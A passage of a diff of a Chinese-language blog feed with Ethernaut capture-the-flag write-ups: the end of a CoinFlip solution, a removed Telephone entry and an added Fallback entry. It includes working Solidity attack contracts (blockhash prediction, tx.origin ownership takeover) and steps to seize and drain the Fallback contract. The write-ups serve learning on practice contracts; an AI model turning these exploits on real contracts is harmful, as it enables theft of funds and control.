class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs s">contract Hack &#123;<br>  CoinFlip target;<br>  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;<br><br>  constructor(address _target) &#123;<br>    target = CoinFlip(_target);<br>  &#125;<br><br>  function flip() public &#123;<br>    bool guess = _guess();<br>    target.flip(guess);<br>  &#125;<br><br>  function _guess() private view returns (bool) &#123;<br>    uint256 blockValue = uint256(blockhash(block.number - 1));<br>    uint256 coinFlip = blockValue / FACTOR;<br>    bool side = coinFlip == 1 ? true : false;<br>    return side;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>之后连续使用攻击合约的flip方法进行攻击10次就行</p><blockquote><p>Tips：<br>SafeMath库：防溢出的增强型运算方法<br>block.num：当前区块数（需要添加一个与web3的链接<br>block.blockhash：区块哈希值</p></blockquote><hr>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;任务要求：连续猜对硬币的正反面十次。&lt;del&gt;区区千分之一的运气我也不是没有&lt;/del&gt;  &lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;源代码：&lt;/strong&gt;&lt;/p&gt;
-&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=</summary>
-      
-    
-    
-    
-    <category term="Ethernaut" scheme="https://mulladylex.github.io/project/categories/Ethernaut/"/>
-    
-    
-    <category term="题解" scheme="https://mulladylex.github.io/project/tags/%E9%A2%98%E8%A7%A3/"/>
-    
-    <category term="Ethereum" scheme="https://mulladylex.github.io/project/tags/Ethereum/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Telephone</title>
-    <link href="https://mulladylex.github.io/project/2023/11/15/Ethernaut/telephone/"/>
-    <id>https://mulladylex.github.io/project/2023/11/15/Ethernaut/telephone/</id>
-    <published>2023-11-15T12:44:02.000Z</published>
-    <updated>2023-11-15T08:41:44.598Z</updated>
-    
-    <content type="html"><![CDATA[<p>任务要求：获取合约的所有权  </p><p><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs s">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Telephone &#123;<br><br>  address public owner;<br><br>  constructor() &#123;<br>    owner = msg.sender;<br>  &#125;<br><br>  function changeOwner(address _owner) public &#123;<br>    if (tx.origin != msg.sender) &#123;<br>      owner = _owner;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>解题点：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs s">function changeOwner(address _owner) public &#123;<br>    if (tx.origin != msg.sender) &#123;<br>      owner = _owner;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>本题涉及到tx.origin与msg.sender的区别：</p><blockquote><p>tx.origin是发起交易的账户<br>msg.sender是当前直接调用这个合约的即时账户</p></blockquote><p>例如：Alice通过调用合约A来调用合约B，合约A中与合约B中的tx.origin与msg.sender的情形如下：</p><table><thead><tr><th>Alice</th><th>-&gt;A</th><th>-&gt;B</th></tr></thead><tbody><tr><td>tx.origin</td><td>Alice</td><td>Alice</td></tr><tr><td>msg.sender</td><td>Alice</td><td>A</td></tr></tbody></table><p>如果情景是在一个合约下的调用，那么这两者是没有区别的；</p><p>参考：将合约复制到Remix中，再编写一个攻击合约，在Ethernaut上获取实例地址，在remix上连接MetaMask钱包部署攻击合约，通过攻击合约调用实例中的方法改变owner</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs s">contract Hack &#123;<br>  constructor(address _addr) &#123;<br>    Telephone(_addr).changeOwner(msg.sender);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr>]]></content>
+    <content type="html"><![CDATA[<p>任务要求：获取合约的所有权；将余额减为零<br><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs s">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Fallback &#123;<br><br>  mapping(address =&gt; uint) public contributions;<br>  address public owner;<br><br>  constructor() &#123;<br>    owner = msg.sender;<br>    contributions[msg.sender] = 1000 * (1 ether);<br>  &#125;<br><br>  modifier onlyOwner &#123;<br>        require(<br>            msg.sender == owner,<br>            &quot;caller is not the owner&quot;<br>        );<br>        _;<br>    &#125;<br><br>  function contribute() public payable &#123;<br>    require(msg.value &lt; 0.001 ether);<br>    contributions[msg.sender] += msg.value;<br>    if(contributions[msg.sender] &gt; contributions[owner]) &#123;<br>      owner = msg.sender;<br>    &#125;<br>  &#125;<br><br>  function getContribution() public view returns (uint) &#123;<br>    return contributions[msg.sender];<br>  &#125;<br><br>  function withdraw() public onlyOwner &#123;<br>    payable(owner).transfer(address(this).balance);<br>  &#125;<br><br>  receive() external payable &#123;<br>    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);<br>    owner = msg.sender;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>解题点：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs s">receive() external payable &#123;<br>  require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);<br>  owner = msg.sender;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过标记owner变量快速查询有关获取合约的所有权的代码。</p><p>在receive方法中我们能够更改owner，在此之前需要我们在contributions中有一点余额，这只需要执行contribute方法就能实现。</p><p>解题参考：<br>1）执行实例中的<code>contribute()</code>，向合约发送最多<code>0.001 ether</code>。<br>2）向合约发送以太，触发<code>receive()</code>。<br>3）执行实例中的<code>withdraw()</code>。</p><blockquote><p>receive()</p><ul><li>一个合约至多含有一个receive()函数,</li><li>没有function关键字、没有参数，没有返回值</li><li>可见性必须声明为external，必须含有payable关键字</li><li>允许使用modifier修改器</li></ul><p>当本合约收到ether但并未被调用任何函数，未接受任何数据，<code>receive()</code>被触发，执行ether的传输（类似于基本的<code>send(),transfer()</code>）；如果合约中不存在此类方法，但拥有一个可支付的回退函数将触发回退函数执行ether的操作；如果都不存在，那么合约将不能接受ether并抛出异常</p><p>选自<a href="https://docs.soliditylang.org/en/v0.8.13/contracts.html#receive-ether-function">solidity官方文档v0.8.13</a></p></blockquote><hr>]]></content>
     
     
       
       
-    <summary type="html">&lt;p&gt;任务要求：获取合约的所有权  &lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;源代码：&lt;/strong&gt;&lt;/p&gt;
-&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line</summary>
+    <summary type="html">&lt;p&gt;任务要求：获取合约的所有权；将余额减为零&lt;br&gt;&lt;strong&gt;源代码：&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;lin</summary>
       
     
     
